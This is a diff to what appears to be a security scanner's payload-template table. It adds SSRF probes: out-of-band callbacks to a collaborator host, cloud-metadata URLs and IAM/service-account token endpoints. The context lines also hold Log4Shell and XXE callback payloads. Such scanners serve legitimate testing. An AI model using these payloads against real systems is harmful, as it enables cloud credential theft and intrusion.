@@ -185,6 +185,37 @@ _TEMPLATES: dict[str, str] = {
     # replacement: ``${jndi:ldap://…}`` and ``<!ENTITY …>`` are untouched.
     "sqli_blind/oob-xxe-exfil": '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{nonce}.{collab}/xxe">]>',
     "command_injection/log4shell-oob": "${jndi:ldap://{nonce}.{collab}/a}",
+    # -- SSRF (Task 24) — hand-tagged, three families --------------------------
+    # Blind SSRF → OOB_CALLBACK: the server fetches a callback URL carrying the
+    # per-probe nonce ({nonce}.{collab}); confirmation is probe_nonce-in-observed.
+    # Non-blind SSRF → STRUCTURAL SSRF_RESPONSE: static cloud-metadata/internal
+    # URLs; confirmation is a known metadata response marker (sentinel) in the
+    # body. Cloud-metadata TOKEN entries → graph_edge_on_success derived_credential
+    # (the fetched response yields a credential, §8).
+    "ssrf/blind/http-callback": "http://{nonce}.{collab}/ssrf",
+    "ssrf/blind/http-callback-bare": "http://{nonce}.{collab}/",
+    "ssrf/blind/https-callback": "https://{nonce}.{collab}/ssrf",
+    "ssrf/blind/dns-only-callback": "http://{nonce}.{collab}/dns",
+    "ssrf/blind/file-scheme": "file://{nonce}.{collab}/etc/passwd",
+    "ssrf/blind/gopher-callback": "gopher://{nonce}.{collab}:70/_",
+    "ssrf/blind/redirect-chain-callback": "http://{nonce}.{collab}/redir?url=http://169.254.169.254/latest/meta-data/",
+    "ssrf/blind/internal-proxy-callback": "http://{nonce}.{collab}/?target=http://127.0.0.1/",
+    "ssrf/nonblind/aws-imds-meta": "http://169.254.169.254/latest/meta-data/",
+    "ssrf/nonblind/aws-imds-user-data": "http://169.254.169.254/latest/user-data/",
+    "ssrf/nonblind/aws-imds-instance-id": "http://169.254.169.254/latest/meta-data/instance-id",
+    "ssrf/nonblind/aws-imds-iam-roles": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+    "ssrf/nonblind/gcp-metadata": "http://metadata.google.internal/computeMetadata/v1/",
+    "ssrf/nonblind/azure-imds": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
+    "ssrf/nonblind/alibaba-ecs-meta": "http://100.100.100.200/latest/meta-data/",
+    "ssrf/nonblind/digitalocean-meta": "http://169.254.169.254/metadata/v1/",
+    "ssrf/nonblind/openstack-meta": "http://169.254.169.254/openstack/latest/meta_data.json",
+    "ssrf/nonblind/kubernetes-api": "https://10.0.0.1/api/v1/namespaces/kube-system/",
+    "ssrf/nonblind/docker-socket": "http://127.0.0.1:2375/containers/json",
+    "ssrf/nonblind/internal-admin": "http://127.0.0.1/admin",
+    "ssrf/token/aws-imds-iam-role": "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin",
+    "ssrf/token/gcp-service-account-token": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
+    "ssrf/token/azure-managed-identity-token": "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com",
+    "ssrf/token/oob-aws-creds-callback": "http://{nonce}.{collab}/creds",
 }
 
 
